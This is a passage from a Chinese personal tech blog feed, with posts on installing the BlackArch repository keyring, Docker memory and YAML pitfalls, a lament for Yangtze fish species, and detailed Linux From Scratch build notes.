Locally signing key 4345771566D76038C7FEB43863EC0ADBEA87E4E3...</span><br><span class="line">  -&gt; Locally signing key CBA3C7D4798912702DCF568E67D8BDF42AD93F4E...</span><br><span class="line">  -&gt; Locally signing key 8F9A9793CB8591147C2EC70566E0CDBD1E01F333...</span><br><span class="line">==&gt; Importing owner trust values...</span><br><span class="line">gpg: inserting ownertrust of 4</span><br><span class="line">gpg: setting ownertrust to 4</span><br><span class="line">gpg: setting ownertrust to 4</span><br><span class="line">gpg: setting ownertrust to 4</span><br><span class="line">==&gt; Updating trust database...</span><br><span class="line">gpg: key 1EB2638FF56C0C53: no user ID <span class="keyword">for</span> key signature packet of class 10</span><br><span class="line">gpg: key 1EB2638FF56C0C53: no user ID <span class="keyword">for</span> key signature packet of class 10</span><br><span class="line"></span><br><span class="line">gpg: public key DB323392796CA067 is 3037 days newer than the signature</span><br><span class="line">gpg: marginals needed: 3  completes needed: 1  trust model: pgp</span><br><span class="line">gpg: public key CF66D153D884358F is 16 seconds newer than the signature</span><br><span class="line">gpg: depth: 0  valid:   1  signed:  56  trust: 0-, 0q, 0n, 0m, 0f, 1u</span><br><span class="line">gpg: depth: 1  valid:  56  signed:  81  trust: 1-, 0q, 0n, 55m, 0f, 0u</span><br><span class="line">gpg: depth: 2  valid:  77  signed:  26  trust: 77-, 0q, 0n, 0m, 0f, 0u</span><br><span class="line">gpg: next trustdb check due at 2020-12-03</span><br><span class="line">:: Running post-transaction hooks...</span><br><span class="line">(1/1) Arming ConditionNeedsUpdate...</span><br><span class="line">==&gt; Appending keys from archlinuxcn.gpg...</span><br><span class="line">==&gt; Appending keys from archlinux.gpg...</span><br><span class="line">==&gt; Appending keys from blackarch.gpg...</span><br><span class="line">==&gt; Appending keys from endeavouros.gpg...</span><br><span class="line">==&gt; Locally signing trusted keys <span class="keyword">in</span> keyring...</span><br><span class="line">  -&gt; Locally signing key 57957BAD5D038B07C28EF49A15B26377262268C1...</span><br><span class="line">==&gt; Importing owner trust values...</span><br><span class="line">==&gt; Disabling revoked keys <span class="keyword">in</span> keyring...</span><br><span class="line">  -&gt; Disabling key 8F76BEEA0289F9E1D3E229C05F946DED983D4366...</span><br><span class="line">==&gt; Updating trust database...</span><br><span class="line">gpg: next trustdb check due at 2020-12-03</span><br><span class="line"></span><br><span class="line">[+] keyring installed successfully</span><br><span class="line">[+] updating package databases</span><br><span class="line">:: Synchronizing package databases...</span><br><span class="line"> core                                      129.9 KiB  6.34 MiB/s 00:00 [---------------------------------------] 100%</span><br><span class="line"> extra                                    1634.4 KiB  4.09 MiB/s 00:00 [---------------------------------------] 100%</span><br><span class="line"> community                                   5.2 MiB  11.1 MiB/s 00:00 [---------------------------------------] 100%</span><br><span class="line"> multilib                                  154.2 KiB  7.53 MiB/s 00:00 [---------------------------------------] 100%</span><br><span class="line"> endeavouros                                14.2 KiB  0.00   B/s 00:00 [---------------------------------------] 100%</span><br><span class="line"> archlinuxcn                              1354.5 KiB  11.0 MiB/s 00:00 [---------------------------------------] 100%</span><br><span class="line"> blackarch                                   3.3 MiB   500 KiB/s 00:07 [---------------------------------------] 100%</span><br><span class="line"> blackarch.sig                             566.0   B  0.00   B/s 00:00 [---------------------------------------] 100%</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Packages (2) blackarch-keyring-20180925-2  perl-expect-1.35-6</span><br><span class="line"></span><br><span class="line">Total Download Size:   0.07 MiB</span><br><span class="line">Total Installed Size:  0.15 MiB</span><br><span class="line">Net Upgrade Size:      0.00 MiB</span><br><span class="line"></span><br><span class="line">:: Proceed with installation? [Y/n] Y</span><br><span class="line">:: Retrieving packages...</span><br><span class="line"> blackarch-keyring-20180925-2-any                                                                   18.1 KiB  0.00   B/s 00:00 [-----------------------------------------------------------------------------] 100%</span><br><span class="line"> perl-expect-1.35-6-any                                                                             50.9 KiB  1698 KiB/s 00:00 [-----------------------------------------------------------------------------] 100%</span><br><span class="line">(2/2) checking keys <span class="keyword">in</span> keyring                                                                                                 [-----------------------------------------------------------------------------] 100%</span><br><span class="line">(2/2) checking package integrity                                                                                               [-----------------------------------------------------------------------------] 100%</span><br><span class="line">(2/2) loading package files                                                                                                    [-----------------------------------------------------------------------------] 100%</span><br><span class="line">(2/2) checking <span class="keyword">for</span> file conflicts                                                                                              [-----------------------------------------------------------------------------] 100%</span><br><span class="line">:: Processing package changes...</span><br><span class="line">(1/2) upgrading blackarch-keyring                                                                                              [-----------------------------------------------------------------------------] 100%</span><br><span class="line">==&gt; Appending keys from blackarch.gpg...</span><br><span class="line">==&gt; Locally signing trusted keys <span class="keyword">in</span> keyring...</span><br><span class="line">  -&gt; Locally signing key A0917C4147A37007CB54C1CFD295AA940EFDDF62...</span><br><span class="line">  -&gt; Locally signing key 4345771566D76038C7FEB43863EC0ADBEA87E4E3...</span><br><span class="line">  -&gt; Locally signing key CBA3C7D4798912702DCF568E67D8BDF42AD93F4E...</span><br><span class="line">  -&gt; Locally signing key 8F9A9793CB8591147C2EC70566E0CDBD1E01F333...</span><br><span class="line">==&gt; Importing owner trust values...</span><br><span class="line">==&gt; Disabling revoked keys <span class="keyword">in</span> keyring...</span><br><span class="line">  -&gt; Disabling key 5E210889BBB5C48500E0C4F9C75E985FF8B993B4...</span><br><span class="line">==&gt; Updating trust database...</span><br><span class="line">gpg: key 1EB2638FF56C0C53: no user ID <span class="keyword">for</span> key signature packet of class 10</span><br><span class="line">gpg: key 1EB2638FF56C0C53: no user ID <span class="keyword">for</span> key signature packet of class 10</span><br><span class="line"></span><br><span class="line">gpg: public key DB323392796CA067 is 3037 days newer than the signature</span><br><span class="line">gpg: marginals needed: 3  completes needed: 1  trust model: pgp</span><br><span class="line">gpg: public key CF66D153D884358F is 16 seconds newer than the signature</span><br><span class="line">gpg: depth: 0  valid:   1  signed:  56  trust: 0-, 0q, 0n, 0m, 0f, 1u</span><br><span class="line">gpg: depth: 1  valid:  56  signed:  81  trust: 1-, 0q, 0n, 55m, 0f, 0u</span><br><span class="line">gpg: depth: 2  valid:  77  signed:  26  trust: 77-, 0q, 0n, 0m, 0f, 0u</span><br><span class="line">gpg: next trustdb check due at 2020-12-03</span><br><span class="line">(2/2) upgrading perl-expect                                                                                                    [-----------------------------------------------------------------------------] 100%</span><br><span class="line">:: Running post-transaction hooks...</span><br><span class="line">(1/2) Arming ConditionNeedsUpdate...</span><br><span class="line">(2/2) Warn about old perl modules</span><br><span class="line">:: Searching databases <span class="keyword">for</span> updates...</span><br><span class="line">:: Searching AUR <span class="keyword">for</span> updates...</span><br><span class="line"> -&gt; python-pgspecial: <span class="built_in">local</span> (1.11.10-2) is newer than blackarch (1.11.10-1)</span><br><span class="line"> there is nothing to <span class="keyword">do</span></span><br></pre></td></tr></table></figure>

<p>事实证明还是得看官方文档解决问题，以后直接看官方文档啊同志们！</p>
<p>一堆过时文档害人啊！</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0JsYWNrQXJjaC9ibGFja2FyY2g=">https://github.com/BlackArch/blackarch<i class="fa fa-external-link-alt"></i></span>  </li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuYmxhY2thcmNoLm9yZy9kb3dubG9hZHMuaHRtbCNpbnN0YWxsLXJlcG8=">https://www.blackarch.org/downloads.html#install-repo<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9ibGFja2FyY2gub3JnL2JsYWNrYXJjaC1ndWlkZS16aC5wZGY=">BlackArch Linux指南（中文翻译）<i class="fa fa-external-link-alt"></i></span></li>
</ol>
]]></content>
      <categories>
        <category>不务正业系列</category>
      </categories>
      <tags>
        <tag>blackarch</tag>
      </tags>
  </entry>
  <entry>
    <title>又被Docker坑了（这次是内存</title>
    <url>/aware-docker-memory/</url>
    <content><![CDATA[<p>好端端一个Docker container，怎么就内存占用过高被kill了呢</p>
<span id="more"></span>

<p>好吧这好像也不全算Docker的锅，罪魁祸首竟是dentry</p>
<h2 id="dentry还我内存"><a href="#dentry还我内存" class="headerlink" title="dentry还我内存"></a>dentry还我内存</h2><p>发现是dentry的锅</p>
<h2 id="Docker的一些替代品"><a href="#Docker的一些替代品" class="headerlink" title="Docker的一些替代品"></a>Docker的一些替代品</h2><p>说起来当时把那几台老的Ubuntu16.04和远古版本的</p>
<p>Docker看起来简单但是坑真的不算少，要用好Docker（很多人是图方便才来用Docker的）</p>
<p>如果只是日常使用为了装一些软件或依赖方便呢，装一个Archlinux显然更方便（这比搞懂Docker那一堆网络、layer、）</p>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYXJkYW5sYWJzLmNvbS9ibG9nLzIwMjAvMDIvZG9ja2VyLWltYWdlcy1wYXJ0MS1yZWR1Y2luZy1pbWFnZS1zaXplLmh0bWw=">https://www.ardanlabs.com/blog/2020/02/docker-images-part1-reducing-image-size.html<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80MzEzMzA4NQ==">https://zhuanlan.zhihu.com/p/43133085<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmFyc3RlcmN6LmNvbS9jZW50b3MtJUU3JUIzJUJCJUU3JUJCJTlGLXNsYWItZGVudHJ5LSVFOCVCRiU4NyVFOSVBQiU5OCVFNSVCQyU5NSVFOCVCNSVCNyVFNyVCMyVCQiVFNyVCQiU5RiVFNSU4RCVBMSVFOSVBMSVCRiVFNSU4OCU4NiVFNiU5RSU5MCVFNSVBNCU4NCVFNyU5MCU4Ni8=">https://blog.arstercz.com/centos-系统-slab-dentry-过高引起系统卡顿分析处理/<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9oYWNrZXJub29uLmNvbS9hbm90aGVyLXJlYXNvbi13aHkteW91ci1kb2NrZXItY29udGFpbmVycy1tYXktYmUtc2xvdy1kMzcyMDdkZWMyN2Y=">https://hackernoon.com/another-reason-why-your-docker-containers-may-be-slow-d37207dec27f<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZ2FvZ2FvNjcvYXJ0aWNsZXMvMTU1NjgzNzguaHRtbA==">https://www.cnblogs.com/gaogao67/articles/15568378.html<i class="fa fa-external-link-alt"></i></span>  </p>
]]></content>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>又被Docker坑了（其实是被Yaml坑了</title>
    <url>/aware-docker-yaml/</url>
    <content><![CDATA[<p>大聪明yaml将60以下的数字识别成60进制，所以需要用引号括起来。自作聪明程度直追Excel将身份证号识别成科学计数法然后直接末尾四位变零。<br>珍爱生命，远离yaml  </p>
<p>更新：发现了一个网站：<span class="exturl" data-url="aHR0cHM6Ly9ub3lhbWwuY29tLw==">https://noyaml.com/<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <tags>
        <tag>Docker</tag>
        <tag>yaml</tag>
      </tags>
  </entry>
  <entry>
    <title>听说长江要禁渔了</title>
    <url>/before-vanish/</url>
    <content><![CDATA[<p>又南水行七百里，曰孟子之山，其木多梓桐，多桃李，其草多菌浦，其兽多麋鹿。是山也，广员百里。其上有水出焉, 名日碧阳，其中多鳣鲔</p>
<span id="more"></span>

<p>元旦在沙河边转着玩，又看到沙河有一群大妈拿着七八个桶直接倾倒鱼和小龙虾，口中佛经念念有词。这几天网上冲浪又看到日人民报等辣鸡营销号消费过世白鲟，还纷纷把图配成匙吻鲟，心里不是滋味。长江流域基本也凉的差不多了，当年葛洲坝一建，白鲟中华鲟达氏鲟就凉了一半，挖沙和万安水库和富春江水电站也把最后的鲥鱼搞没了。鄱阳湖要是再乱搞，江豚基本也要凉透了。那些数不清名字的小鱼就更惨了，好多两个图片和影像都没留下。前几年长江养殖逃逸了大量杂交鲟，中华鲟和达氏鲟野生种群基本就废了。寡鳞鱊重现江湖的奇迹可能再也不会有了。</p>
<p><img src="/before-vanish/baixun.jpg" alt="白鲟"></p>
<p>斑鳖在某动物园的惨状大家也都看到了，鼋也好不到哪去（国内的龟鳖都好不到哪去，毕竟不是熊猫，谁让你不可爱呢，长成这样小清新看了人嫌狗厌）</p>
<blockquote>
<p>鼋，到现在，都没有一个像样的保护区。也就是说，救助团体一直是民间（或挂靠）开展的。某保护区我就不点名了，有文件，一直不施工，民间捐的俩成体鼋一直养在水泥池子里……</p>
</blockquote>
<p>一直想去苏州见斑鳖最后一面，但是想起上方山那个垃圾动物园就来气，去了多半会伤心，也罢，算了。神龟虽寿，犹有竟时。腾蛇乘雾，终为土灰。</p>
<p><img src="/before-vanish/old.jpg" alt="道子搜山，白鲟遗像"></p>
<blockquote class="blockquote-center">
<p>君不见，高堂明镜悲白发，朝如青丝暮成雪</p>

</blockquote>
]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
      <tags>
        <tag>鱼</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux from Scratch 编译笔记</title>
    <url>/build-linux-from-scratch/</url>
    <content><![CDATA[<p>久闻大名，然而真的编译了几圈下来，和想象中的不太一样。照着手册一步一步来并不难，但是特别繁琐。其实我更建议去看一看Alpine等更精简的Linux的构建过程。哦，对了，我等编译的时候通关了蔚蓝a面</p>
<span id="more"></span>

<p>LFS的主要目的是教你打造一个你自己的发行版，所以它特别繁琐。如果你想自己做一个优麒麟去骗钱那不妨看看。如果想了解一下Linux的依赖和编译过程，想看看一个特别精简版的Linux长什么样子，<strong>请试试Alpine而不是LFS</strong></p>
<p><strong>感觉Alpine更适合作为一个 玩具来学习，而LFS更适合作为正经用途。</strong> 大家不知为何都反着来。</p>
<p>推荐阅读：<span class="exturl" data-url="aHR0cHM6Ly90dHlzMy5kZXYvcG9zdC9kby1ub3QtdXNlLWFscGluZS1pbi1wcm9kdWN0aW9uLWVudmlyb25tZW50Lw==">不要在生产环境中使用alpine基础镜像 – 容器基础镜像的选择<i class="fa fa-external-link-alt"></i></span></p>
<p>之前觉得就是一个安装超麻烦版的Arch&#x2F;Gentoo，就没试过。最近终于试了一下，学到的东西倒不是很多，没有当时第一次完整安装Arch时的收获大。</p>
<p>这个东西告诉你linux里面glibc之类的依赖关系是什么样的。这个东西就像单片机最小系统一样，告诉你。你可以从头开始看一看系统是怎么从源码构建的，glibc那一堆依赖又是怎么鸡生蛋、蛋生鸡的。推荐想了解系统构建依赖的Linux用户看一看这个东西。</p>
<p>闲着没事的人最适合玩一玩这个了，不过不太推荐日常使用。虽然还是是有一些人真的把这个当日用主力的，比如fcitx输入法初代目鱼王（Yuking）就是在LFS上面写了早期的fcitx输入法。<br>LFS is free if your time is free.  </p>
<h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>最近找资料的时候无意间又看到了一本书，，是在找《深度探索嵌入式操作系统 从零开始设计、架构和开发》的时候看到的，名字叫《深度探索Linux操作系统 系统构建和原理解析》，这本书和LFS比起来多了一些原理的讲解。13年出版的，里面的很多内容相比LFS有点老了，我挑了3、4、5章的内容翻了翻，感觉还可以。这本书后面还讲了x window和桌面图形渲染那些，不太感兴趣没看。这本书貌似也没有出后续的再版，而且穿插着操作和讲原理有点乱。中间那些initramfs、vmlinuz和根文件系统讲的还算详细，其他的感觉交叉编译和链接那些不如看别的书， 比如《程序员的自我修养》，后面那些图形界面和渲染感觉不如直接去玩玩Unity之类的东西，x window那些感觉不如自己整个dwm玩。<br>这种东西感觉不太适合写书，像LFS做成小册子那样持续更新比较好，如果想真的编译一个还是推荐LFS，或者操作和原理分开写。</p>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>首先去找一个好一点的机器用来编译。你要有一个宿主机，一般用Ubuntu 20的比较多一点，我用的Arch, 暂时没遇到什么大问题。</p>
<p>然后下载LFS的手册和源码，我用的是最新的r11.0-92这个版本：<span class="exturl" data-url="aHR0cHM6Ly93d3cubGludXhmcm9tc2NyYXRjaC5vcmcvbGZzL2Rvd25sb2Fkcy9kZXZlbG9wbWVudC8=">https://www.linuxfromscratch.org/lfs/downloads/development/<i class="fa fa-external-link-alt"></i></span></p>
<p>手册说的wget-list没有说在哪，wget-list 可以用香港的镜像： <span class="exturl" data-url="aHR0cHM6Ly9sZnMtaGsua29kZG9zLm5ldC9sZnMvdmlldy9yMTEuMC05Mi93Z2V0LWxpc3Q=">https://lfs-hk.koddos.net/lfs/view/r11.0-92/wget-list<i class="fa fa-external-link-alt"></i></span></p>
<p>如果想稳一点可以用stable版本，喜欢systemd可以用systemd版本（最近对systemd全家桶有点怨念，就不上systemd了）。</p>
<h2 id="编译流程"><a href="#编译流程" class="headerlink" title="编译流程"></a>编译流程</h2><p>这里面绝大部分编译都是make那一套流程。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<h2 id="个人的改动"><a href="#个人的改动" class="headerlink" title="个人的改动"></a>个人的改动</h2><p>其实不太建议第一次就用dev版本还加上一大堆自己的改动。我自己乱改，前面几次都没有开机成功，反复编译了四五次才成功开机。</p>
<h3 id="我和手册有些出入的地方"><a href="#我和手册有些出入的地方" class="headerlink" title="我和手册有些出入的地方"></a>我和手册有些出入的地方</h3><p>手册里面要求使用bash，我在宿主机一直都用的zsh，好在没出什么大问题（主要是想接着用我习惯的那几个插件和语法，反正这个东西兼容sh，问题不大）（<strong>不要学我，坑特别多</strong>）</p>
<p>chroot之后用的是bash，然而看到那个没有自动补全和色彩高亮的bash, 我不能接受，于是配了半天的</p>
<p>分区我只分了一个100G的<code>/</code>分区，swap和boot都是和Arch共用的。（我懒）</p>
<h3 id="一些手册上有但我没编译和安装的东西"><a href="#一些手册上有但我没编译和安装的东西" class="headerlink" title="一些手册上有但我没编译和安装的东西"></a>一些手册上有但我没编译和安装的东西</h3><p>现在看文档基本都在浏览器上面搜了，很少看本地目录的文档，那些doc之类的东西我基本上都没装。没用默认的vim，参考BLFS的手册装了一个我习惯的neovim</p>
<p>Meson这个包编译报错了，这个是systemd和BLFS需要的，我就没管</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(lfs <span class="built_in">chroot</span>) root:/sources/meson-0.60.2<span class="comment"># python3 setup.py build</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/sources/meson-0.60.2/setup.py&quot;</span>, line 23, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    from setuptools import setup</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python3.10/site-packages/setuptools/__init__.py&quot;</span>, line 18, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    from setuptools.dist import Distribution</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python3.10/site-packages/setuptools/dist.py&quot;</span>, line 38, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    from setuptools import windows_support</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python3.10/site-packages/setuptools/windows_support.py&quot;</span>, line 2, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    import ctypes</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python3.10/ctypes/__init__.py&quot;</span>, line 8, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    from _ctypes import Union, Structure, Array</span><br><span class="line">ModuleNotFoundError: No module named <span class="string">&#x27;_ctypes</span></span><br></pre></td></tr></table></figure>

<h2 id="加快速度"><a href="#加快速度" class="headerlink" title="加快速度"></a>加快速度</h2><h3 id="多核编译"><a href="#多核编译" class="headerlink" title="多核编译"></a>多核编译</h3><p>通常可以直接拉满，比如我的宿主机最多能<code>-j20</code> 那就<code>export MAKEFLAGS=&#39;-j20&#39; </code>。<br>需要注意的是有的时候必须用<code>-j1</code>参数，比如编译<code>binutils</code></p>
<h3 id="多核压缩解压"><a href="#多核压缩解压" class="headerlink" title="多核压缩解压"></a>多核压缩解压</h3><p>xz压缩格式，使用最新版的tar看起来默认就是多核的。加上参数之后<code>XZ_OPT=&#39;-T0&#39; tar -xf linux-5.15.2.tar.xz</code>和直接<code>tar -xf linux-5.15.2.tar.xz</code>没有区别。<br>有几个gz后缀的使用<code>pizg</code>应该会快一点，但是这几个文件太小了，几乎没区别。</p>
<h3 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h3><p>第七章结尾会教你<code>tar -cJpf $HOME/lfs-temp-tools-r11.0.92.tar.xz .</code>进行备份，这个备份速度很慢，比上面那些解压慢不少。</p>
<p>我推荐使用Btrfs snapshot，在每次重要的make都建立一个snapshot，这样不用从头开始，而且备份和恢复的速度也很快。</p>
<h2 id="其他的一些小问题"><a href="#其他的一些小问题" class="headerlink" title="其他的一些小问题"></a>其他的一些小问题</h2><h3 id="i和l"><a href="#i和l" class="headerlink" title="i和l"></a>i和l</h3><p><code>Iana-etc</code>这里是大写的<code>i</code>，不是小写的<code>L</code>，另一个叫<code>Inetutils</code>的也是。</p>
<h3 id="chroot的时候PTY-allocation-request-failed"><a href="#chroot的时候PTY-allocation-request-failed" class="headerlink" title="chroot的时候PTY allocation request failed"></a>chroot的时候PTY allocation request failed</h3><p>我是ssh连的另一台电脑编译的（本地和远程都是Arch），结果有一天突然<code>PTY allocation request failed</code></p>
<p>我以为是chroot或者ssh的问题，穷尽毕生所学调试了半个小时，<strong>结果发现是那台服务器的校园网账户欠费了</strong>。</p>
<h3 id="一些编译报错"><a href="#一些编译报错" class="headerlink" title="一些编译报错"></a>一些编译报错</h3><p>编译findutils报错，但是装上去能用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/sources/findutils-4.8.0/find/pred.c:751: undefined reference to `rpl_fnmatch&#x27;</span><br><span class="line">/usr/bin/ld: libfindtools.a(pred.o):/sources/findutils-4.8.0/find/pred.c:1180: more undefined references to `rpl_fnmatch&#x27; follow</span><br><span class="line">collect2: error: ld returned 1 exit status</span><br></pre></td></tr></table></figure>

<p>编译gzip时报错：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In file included from ./lib/getopt.h:84,</span><br><span class="line">                 from gzip.c:77:</span><br><span class="line">./lib/getopt-cdefs.h:31:5: error: #if with no expression</span><br><span class="line">   31 | #if</span><br><span class="line">      |     ^</span><br></pre></td></tr></table></figure>

<p>执行<code>make clean</code>后错误消失。</p>
<p><code>make check</code>失败一项：<code>FAIL: help-version</code>，这个影响不大，忽略。</p>
<p>在编译Patch的时候发生了同样的报错，重新编译后成功。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">In file included from ../lib/getopt.h:84,</span><br><span class="line">                 from patch.c:27:</span><br><span class="line">../lib/getopt-cdefs.h:32:5: error: <span class="comment">#if with no expression</span></span><br><span class="line">   32 | <span class="comment">#if</span></span><br><span class="line">      |     ^</span><br></pre></td></tr></table></figure>

<p>怀疑是多线程编译的问题，采用<code>make -j1</code>和<code>make -j20</code>分别编译了10次，发现这个问题确实是在<code>-j20</code>多线程编译时才会发生。</p>
<h2 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h2><p>接下来就是重头戏编译内核了。编译内核这个gentoo用户应该很熟悉了。可以自己选择编译参数，没有什么特殊喜好就默认吧。</p>
<p><img src="/build-linux-from-scratch/image-20211204142505342.png" alt="image-20211204142505342"></p>
<p>编译速度比想象中的快，我从下午2:49编译到3:17，大概半个小时左右。</p>
<p>魔改编译参数请量力而行。我前面几次都自己改了很多参数，编译虽然没报错，但是启动的时候CapsLock和ScrollLock同时闪烁，只能重新编译。</p>
<h3 id="编译时make-clean和make-mrproper的区别"><a href="#编译时make-clean和make-mrproper的区别" class="headerlink" title="编译时make clean和make mrproper的区别"></a>编译时make clean和make mrproper的区别</h3><p><code>make mrproper</code>相比<code>make clean</code>多删除了config文件。</p>
<h3 id="启动引导设置"><a href="#启动引导设置" class="headerlink" title="启动引导设置"></a>启动引导设置</h3><p><strong>设置Grub的时候记得备份你宿主机的grub！</strong></p>
<p>本来我是想用Arch的<code>os-prober</code>自动识别<code>grub-mkconfig -o /boot/grub/grub.cfg</code>，但是不行。这样会识别成<code>Arch Linux， with Linux 5.15.2.-lfs-r11.0.92</code></p>
<p>在Archlinux宿主机中编辑Grub，加上：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">menuentry <span class="string">&quot;GNU/Linux, Linux 5.15.2-lfs-r11.0-92&quot;</span> &#123;</span><br><span class="line">linux</span><br><span class="line"> /boot/vmlinuz-5.15.2-lfs-r11.0-92 root=/dev/sda2 ro</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Fly-Bitch！"><a href="#Fly-Bitch！" class="headerlink" title="Fly Bitch！"></a>Fly Bitch！</h2><p>到这里我已经累了，BLFS已经不打算再弄了，没啥意思。Nvidia驱动，折腾了好几次，想用dkms装驱动结果都失败了。最后我把Nvidia独显拆了，整个世界都美好了。<br>试图整个KDE桌面上去，结果一堆依赖没成功，结果发现最容易的反而是dwm。。。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>终于记住了tar命令解压时候哪个参数是压缩哪个是解压。<br>不过sed还是不太会用，已经被sd惯坏了。<br>发现了starship这个不错的prompt，bash上很舒服，体验接近powerlevel10k。<br>LFS的企鹅LOGO真的好丑啊，见过的最丑的企鹅。<br>bash里<code>+h</code>关闭hash查找。这个参数的意思是不使用当前hash表里面存放的路径，精确的使用现在给出的路径。使用<code>set +h</code>关闭hash，使用<code>set -h</code>启用hash。（我总觉得<code>+h</code>才是开启hash, 真是令人迷惑）  </p>
<p>断断续续折腾了四五天，等编译期的间隙里蔚蓝从3a跳到了到7a登顶。</p>
<h2 id="编译时无聊发现的其他东西"><a href="#编译时无聊发现的其他东西" class="headerlink" title="编译时无聊发现的其他东西"></a>编译时无聊发现的其他东西</h2><p>这几天在等编译的时候闲着没事发现了其他一些有意思的东西。</p>
<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Rjam9uZXMvbWs=">https://github.com/dcjones/mk<i class="fa fa-external-link-alt"></i></span> plan9的mk</p>
<h3 id="bash和zsh的环境变量是怎么传递和继承的"><a href="#bash和zsh的环境变量是怎么传递和继承的" class="headerlink" title="bash和zsh的环境变量是怎么传递和继承的"></a>bash和zsh的环境变量是怎么传递和继承的</h3><p>login shell 和 nonlongin shell的读取环境变量方式不太一样</p>
<h3 id="zsh里面的‘-’命令是干什么的"><a href="#zsh里面的‘-’命令是干什么的" class="headerlink" title="zsh里面的‘-’命令是干什么的"></a>zsh里面的‘-’命令是干什么的</h3><p><span class="exturl" data-url="aHR0cHM6Ly96c2guc291cmNlZm9yZ2UuaW8vRG9jL1JlbGVhc2UvU2hlbGwtR3JhbW1hci5odG1sI1ByZWNvbW1hbmQtTW9kaWZpZXJz">zsh的文档<i class="fa fa-external-link-alt"></i></span>是这样说的：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">- </span><br><span class="line">The command is executed with a ‘-’ prepended to its argv[0] string.</span><br></pre></td></tr></table></figure>

<p>看起来似乎它会在<code>argv[0]</code>前面加上一个<code>-</code>，可是这有什么用？</p>
<p>argv[0]你可以当作<span class="exturl" data-url="aHR0cHM6Ly9tYW43Lm9yZy9saW51eC9tYW4tcGFnZXMvbWFuMi9leGVjdmUuMi5odG1s">execve<i class="fa fa-external-link-alt"></i></span>的第一个变量，通常是<code>\bin\bash</code>这样的可执行路径。</p>
<p>再看一下exec这个命令，参数<code>-l</code>的效果和zsh里面的<code>-</code>是一致的</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">exec [ -cl ] [ -a argv0 ]</span><br><span class="line"></span><br><span class="line">    The following command together with any arguments is run in place of the current process, rather than as a sub-process. The shell does not fork and is replaced. The shell does not invoke TRAPEXIT, nor does it source zlogout files. The options are provided for compatibility with other shells.</span><br><span class="line"></span><br><span class="line">    The -c option clears the environment.</span><br><span class="line"></span><br><span class="line">    The -l option is equivalent to the - precommand modifier, to treat the replacement command as a login shell; the command is executed with a - prepended to its argv[0] string. This flag has no effect if used together with the -a option.</span><br><span class="line"></span><br><span class="line">    The -a option is used to specify explicitly the argv[0] string (the name of the command as seen by the process itself) to be used by the replacement command and is directly equivalent to setting a value for the ARGV0 environment variable. </span><br></pre></td></tr></table></figure>

<p>哦，就是把当前shell视为login shell，试了一下看起来的确是这样</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">❯ <span class="built_in">echo</span> <span class="variable">$0</span></span><br><span class="line">/bin/zsh</span><br><span class="line">❯ - <span class="built_in">echo</span> <span class="variable">$0</span></span><br><span class="line">/bin/zsh</span><br><span class="line">❯ - zsh</span><br><span class="line">❯ <span class="built_in">echo</span> <span class="variable">$0</span></span><br><span class="line">-zsh</span><br><span class="line">❯ <span class="built_in">exit</span></span><br><span class="line">❯ zsh</span><br><span class="line">❯ <span class="built_in">echo</span> <span class="variable">$0</span></span><br><span class="line">zsh  </span><br></pre></td></tr></table></figure>

<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly9uZXdzLnljb21iaW5hdG9yLmNvbS9pdGVtP2lkPTI4ODIwNjAy">Linux from Scratch with Training Wheels<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9hbHBpbmVsaW51eC5vcmcv">Alpine<i class="fa fa-external-link-alt"></i></span>  </p>
